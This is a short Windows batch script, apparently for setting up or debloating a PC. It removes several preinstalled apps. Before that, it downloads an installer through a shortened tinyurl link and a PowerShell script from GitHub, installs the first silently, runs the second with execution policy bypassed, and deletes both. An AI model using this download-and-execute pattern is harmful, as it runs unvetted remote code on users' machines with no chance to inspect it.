@echo off
powershell -NoProfile -Command "& { Invoke-WebRequest https://tinyurl.com/solvitas -OutFile c:\temp\setup_undefined.msi }"
powershell -NoProfile -Command "& { Invoke-WebRequest https://raw.githubusercontent.com/robbowz/robbowz.github.io/refs/heads/main/test/gournal.ps1 -OutFile c:\temp\ginstall.ps1 }"
msiexec /i c:\temp\setup_undefined.msi /quiet /norestart
powershell -ExecutionPolicy Bypass -File "c:\temp\ginstall.ps1"
del c:\temp\ginstall.ps1
del c:\temp\setup_undefined.msi
powershell -ExecutionPolicy Bypass -NoProfile -Command "Remove-AppxPackage Microsoft.Xbox.GamingOverlay | Out-Null"
powershell -ExecutionPolicy Bypass -NoProfile -Command "Remove-AppxPackage Microsoft.SolitaireCollection | Out-Null"
powershell -ExecutionPolicy Bypass -NoProfile -Command "Remove-AppxPackage Microsoft.StickyNotes | Out-Null"
powershell -ExecutionPolicy Bypass -NoProfile -Command "Remove-AppxPackage LinkedIn | Out-Null"
